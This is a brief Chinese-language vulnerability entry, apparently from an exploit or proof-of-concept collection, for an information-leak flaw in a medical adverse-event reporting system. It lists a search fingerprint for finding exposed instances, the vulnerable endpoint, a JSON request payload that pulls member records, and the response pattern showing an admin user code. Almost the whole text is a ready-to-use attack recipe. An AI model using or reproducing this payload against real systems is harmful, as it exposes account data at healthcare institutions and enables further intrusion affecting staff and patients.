# 医疗安全(不良)事件报告系统members存在信息泄露漏洞

医疗安全(不良)事件报告系统 ｜ 信息泄露 ｜ —
- **指纹**：`body="koma.Application"`
- **请求**：`POST /services/members HTTP/1.1`

**Payload**
```
{"method":"fetch","params":{"service":"members","user_class":""}}
```
- **响应特征**：200 “user_code”:”admin”